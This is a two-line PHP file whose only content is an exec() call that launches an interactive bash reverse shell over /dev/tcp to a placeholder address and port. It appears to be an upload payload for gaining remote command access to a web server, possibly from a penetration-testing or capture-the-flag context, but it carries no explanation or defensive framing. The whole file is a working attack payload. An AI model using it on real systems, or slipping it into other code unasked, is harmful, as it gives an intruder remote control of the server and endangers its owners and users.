<?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1'");
